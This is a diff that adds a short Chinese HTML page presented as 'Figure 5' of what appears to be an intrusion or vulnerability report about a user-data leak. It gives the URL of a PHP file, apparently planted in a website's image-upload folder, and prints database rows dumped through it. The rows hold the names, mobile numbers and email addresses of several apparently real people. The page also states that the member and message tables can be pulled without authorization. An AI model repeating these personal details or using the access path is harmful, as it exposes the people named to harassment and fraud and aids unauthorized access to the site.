@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>图5 - 用户隐私明文泄露</title>
+<style>
+body{font-family:Consolas,monospace;background:#1e1e1e;color:#d4d4d4;padding:24px;line-height:1.6}
+h1{color:#569cd6;font-family:Microsoft YaHei,sans-serif;font-size:18px}
+.sub{color:#9cdcfe;font-size:13px;margin-bottom:20px;font-family:Microsoft YaHei,sans-serif}
+pre{background:#2d2d2d;border:1px solid #3c3c3c;padding:16px;border-radius:6px;overflow:auto;font-size:12px}
+.sec{color:#4ec9b0;margin-top:16px}.pii{color:#ce9178}
+</style>
+</head>
+<body>
+<h1>【图5】数据库查询 — 用户手机号/邮箱明文泄露</h1>
+<div class="sub">访问：https://www.biobasebaby.com/uploads/images/20260711/d970db247d6121d7ee98cde403e6fcde.php</div>
+<pre><span class="sec">=== yzn_member ===</span>
+Array
+(
+    [username] => admin
+    [nickname] => <span class="pii">宋少甫</span>
+    [email] => <span class="pii">1234@qq.com</span>
+    [mobile] => <span class="pii">15508670832</span>
+)
+
+<span class="sec">=== yzn_form_message ===</span>
+Array
+(
+    [messageusername] => <span class="pii">邓龙</span>
+    [messageuserphone] => <span class="pii">15286469040</span>
+    [messageuseremail] => <span class="pii">1294344558@qq.com</span>
+)
+Array
+(
+    [messageusername] => <span class="pii">王宇涵</span>
+    [messageuserphone] => <span class="pii">13886001286</span>
+    [messageuseremail] => <span class="pii">2416115911@qq.com</span>
+)
+Array
+(
+    [messageusername] => <span class="pii">杨生</span>
+    [messageuserphone] => <span class="pii">18566248565</span>
+    [messageuseremail] => <span class="pii">yangxg029@163.com</span>
+)</pre>
+<p class="sub">会员表、留言表均可未授权拖取，含真实用户手机号和邮箱。</p>
+</body>
+</html>
